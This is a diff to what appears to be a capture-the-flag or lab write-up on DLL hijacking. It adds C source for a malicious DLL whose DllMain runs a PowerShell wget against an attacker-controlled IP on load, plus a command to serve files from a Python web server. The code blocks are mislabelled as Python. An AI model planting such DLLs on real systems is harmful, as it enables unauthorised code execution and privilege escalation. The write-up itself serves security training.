@@ -716,5 +716,29 @@ Since i have full write access on this i should be able to plant a malicious DLL
 Ill use the following c code
 
 ```python
+#include <windows.h>
+		
+#pragma comment(lib, "user32.lib")
+		
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+	switch (fdwReason)
+	{
+		case DLL_PROCESS_ATTACH:
+		    WinExec("powershell -c wget http://10.200.75.73/test.txt -o test.txt", SW_SHOW);
+		    break;
+	}
+		
+	return TRUE;
+}
+```
+
+Ill then set a python web server
+
+```python
+python3 -m http.server 80
+```
+
+```python
 
 ```
